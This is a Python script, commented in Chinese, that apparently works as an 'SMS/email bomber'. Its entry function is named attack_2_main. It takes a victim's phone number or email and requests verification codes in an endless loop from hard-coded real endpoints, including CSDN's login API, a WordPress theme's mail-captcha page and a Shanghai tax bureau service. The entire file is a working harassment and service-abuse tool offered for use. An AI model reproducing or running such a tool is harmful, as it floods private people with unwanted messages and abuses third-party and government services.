import requests
import re
from colorama import Fore, Style, init

# 初始化 colorama
init(autoreset=True)

def is_valid_mobile_number(mobile_number):
    pattern = re.compile(r"^1[3-9]\d{9}$")
    return pattern.match(mobile_number)

def is_valid_email(email):
    pattern = re.compile(r"^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$")
    return pattern.match(email)

def send_request(url, headers, payload, target_type, user_input, timeout=5):
    try:
        if headers.get("Content-Type") == "application/json;charset=UTF-8":
            payload[target_type] = user_input
            response = requests.post(url, headers=headers, json=payload, timeout=timeout)
        else:
            payload_str = "&".join([f"{key}={value}" for key, value in payload.items()])
            payload_str = payload_str.replace(f"{target_type}=", f"{target_type}={user_input}")
            response = requests.post(url, headers=headers, data=payload_str, timeout=timeout)
        return response
    except requests.exceptions.Timeout:
        print(Fore.YELLOW + f"请求超时，跳过接口: {url}")
        return None
    except Exception as e:
        print(Fore.RED + f"请求失败: {e}")
        return None

def send_dynamic_request(url, user_input, timeout=5):
    try:
        url = url.replace("{mobile}", user_input)
        response = requests.get(url, timeout=timeout)
        return response
    except requests.exceptions.Timeout:
        print(Fore.YELLOW + f"请求超时，跳过接口: {url}")
        return None
    except Exception as e:
        print(Fore.RED + f"请求失败: {e}")
        return None

def send_sms_verification(user_input, interfaces):
    if is_valid_mobile_number(user_input):
        target_type = "mobile"
    elif is_valid_email(user_input):
        target_type = "email"
    else:
        print(Fore.RED + "手机号或邮箱格式错误，请输入有效的手机号或邮箱。")
        return

    try:
        count = 0
        while True:
            count += 1
            print(Fore.YELLOW + f"\n第 {count} 次发送:")
            for idx, interface in enumerate(interfaces):
                print(Fore.CYAN + f"\n接口 {idx+1}: {interface['url']}")
                try:
                    if target_type == "mobile" and "payload" in interface and "mobile" in interface["payload"]:
                        response = send_request(interface["url"], interface["headers"], interface["payload"], "mobile", user_input)
                    elif target_type == "email" and "payload" in interface and "email" in interface["payload"]:
                        response = send_request(interface["url"], interface["headers"], interface["payload"], "email", user_input)
                    elif target_type == "mobile" and "dynamic" in interface:
                        response = send_dynamic_request(interface["url"], user_input)
                    else:
                        continue

                    if response is None:
                        continue  # 如果请求超时或失败，跳过当前接口

                    if response.status_code == 200:
                        print(Fore.GREEN + "成功发送验证码")
                        try:
                            print(Fore.GREEN + "响应内容:", response.json())
                        except requests.exceptions.JSONDecodeError:
                            print(Fore.GREEN + "响应内容不是有效的 JSON:", response.text)
                    else:
                        print(Fore.RED + f"发送验证码失败，响应码: {response.status_code}")
                        print(Fore.RED + "响应内容:", response.text)
                except Exception as e:
                    print(Fore.RED + f"请求失败: {e}")
    except KeyboardInterrupt:
        print(Fore.RED + "\n用户中断，程序停止。")

def attack_2_main():
    user_input = input("请输入手机号: ")
    send_sms_verification(user_input, interfaces)

# 接口配置
interfaces = [
    {
        "url": "https://passport.csdn.net/v1/login/sendVerifyCode",
        "headers": {
            "Host": "passport.csdn.net",
            "Content-Type": "application/json;charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; PHW110 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.134 Mobile Safari/537.36",
        },
        "payload": {
            "code": "0086",
            "platform": "WAP",
            "type": "popupLogin",
            "spm": "1001.2101.3001.7902",
            "mobile": ""
        }
    },
    {
        "url": "https://zmingcx.com/wp-content/themes/begin/mail-captcha.php?0.17748457886315183",
        "headers": {
            "Host": "zmingcx.com",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; PHW110 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.134 Mobile Safari/537.36",
        },
        "payload": {
            "action": "eer_captcha",
            "email": "",
            "user_name": "kisskdk"
        }
    },
    {
        "url": "https://shanghai.chinatax.gov.cn/jkfw/api/v1.0/services/ssqh/sendCrcByPhoneNum?phoneNum={mobile}",
        "dynamic": True
    }
]

if __name__ == "__main__":
    attack_2_main()